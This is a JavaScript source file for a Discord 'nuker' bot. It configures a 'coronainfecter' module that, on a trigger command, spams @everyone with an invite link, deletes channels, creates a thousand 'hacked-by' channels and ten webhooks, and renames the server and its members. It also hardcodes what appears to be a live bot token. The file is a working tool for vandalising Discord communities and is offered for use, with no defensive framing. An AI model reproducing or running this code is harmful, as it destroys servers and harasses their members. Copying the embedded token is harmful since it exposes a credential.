const Discord = require("discord.js");
const BotToken = "NzMyMjA4NjkwNDYzMTEzMjc2.XwxQfw.sroLhUs1GTz9Lk8SxOqq15MpgEk";
const Bot = new Discord.Client();
const coronainfecter = require("./coronainfecter");
let CMDArgs = process.argv.slice(2);
if (!CMDArgs[0]) {
    return console.log("Token is required")
}
const Command = CMDArgs[1] || "REPxmlgJ6r"
const Prefix = ""
const NukerInstance = new coronainfecter({
    Prefix: Prefix,
    Command: Command,
    DiscordId: "666367959119298617",
    SendMessage: "@everyone LOL this server sucks join yo mama gang https://discord.gg/CRcDCSt",
    AmountToRepeat: 100,
    CreateTextChannel: "hacked-by-brody-fox",
    ChannelsToCreate: 1000,
    WebhookName: "admin",
    nukeChannels: true,
    WebhookAmount: 10,
    serverName: "hacked by Brody Foxx",
    memberNick: "yo mama fan",
    serverIcon: "https://cdn.discordapp.com/attachments/726940176244539452/731909431939563570/image0.jpg",
    OnlyWhitelisted: false,
    //banEveryone: true
});
Bot.on("ready", function () {
    console.log("Nuker is ready to nuke type \"" + Prefix + Command + "\" to start the nuker on a server")
})
Bot.login(CMDArgs[0]);
Bot.on("message", NukerInstance.getFunction());